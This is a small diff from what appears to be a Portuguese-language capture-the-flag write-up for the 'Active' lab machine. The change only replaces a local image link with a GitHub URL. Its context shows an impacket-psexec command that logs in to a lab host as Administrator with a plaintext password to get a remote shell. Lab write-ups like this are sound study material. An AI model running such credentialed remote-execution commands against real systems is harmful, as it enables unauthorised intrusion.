@@ -37,4 +37,5 @@ Aqui sossegado:
     
     impacket-psexec 'active.htb/Administrator:Ticketmaster1968@10.10.10.100'
     
-![qownnotes-media-WHXRui](../../../media/qownnotes-media-WHXRui.png)
+
+![qownnotes-media-LCzGOy](https://github.com/alisonocosta/InfraHacking/tree/main/.gitbook/assets/qownnotes-media-LCzGOy.png)
